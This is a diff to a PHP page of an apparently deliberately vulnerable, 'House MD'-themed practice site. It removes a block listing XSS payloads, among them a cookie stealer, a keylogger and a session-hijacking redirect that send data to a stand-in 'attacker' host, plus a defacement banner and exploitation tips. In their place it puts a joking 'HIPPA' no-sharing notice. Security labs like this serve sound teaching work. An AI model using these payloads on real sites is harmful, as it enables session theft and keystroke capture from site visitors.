@@ -54,52 +54,8 @@ if ($searchTerm) {
 
 echo <<<HTML
     <div class="vuln-section">
-        <h3>XSS Vulnerability</h3>
-        <p>This search form is vulnerable to Cross-Site Scripting (XSS) attacks.</p>
-        
-        <div class="xss-payloads">
-            <h4>Try these payloads:</h4>
-            
-            <div class="payload">
-                <h5>Simple Alert</h5>
-                <code>&lt;script&gt;alert('House MD XSS')&lt;/script&gt;</code>
-                <p>Basic proof of concept</p>
-            </div>
-            
-            <div class="payload">
-                <h5>Session Stealer</h5>
-                <code>&lt;script&gt;fetch('http://attacker/?cookie='+document.cookie)&lt;/script&gt;</code>
-                <p>Steals session cookies</p>
-            </div>
-            
-            <div class="payload">
-                <h5>Keylogger</h5>
-                <code>&lt;script&gt;document.onkeypress=function(e){fetch('http://attacker/?key='+e.key)}&lt;/script&gt;</code>
-                <p>Logs all keystrokes</p>
-            </div>
-            
-            <div class="payload">
-                <h5>Defacement</h5>
-                <code>&lt;div style="position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;z-index:9999"&gt;HACKED BY HOUSE MD TEAM&lt;/div&gt;</code>
-                <p>Shows a persistent banner</p>
-            </div>
-            
-            <div class="payload">
-                <h5>Session Hijacking</h5>
-                <code>&lt;script&gt;document.location='http://attacker/steal.php?cookie='+document.cookie&lt;/script&gt;</code>
-                <p>Redirects to attacker with session</p>
-            </div>
-        </div>
-        
-        <div class="xss-tips">
-            <h4>Tips for Successful Exploitation:</h4>
-            <ul>
-                <li>Use payloads in the search field</li>
-                <li>Try both the error message and diagnosis fields</li>
-                <li>For persistent effects, use the defacement payload</li>
-                <li>To test without breaking layout, use the alert payload</li>
-            </ul>
-        </div>
+        <h3>Do not Disclose this DATA!</h3>
+        <p>This data is HIPPA or something, NO SHARING: SHARING BAD</p>
     </div>
 HTML;
 
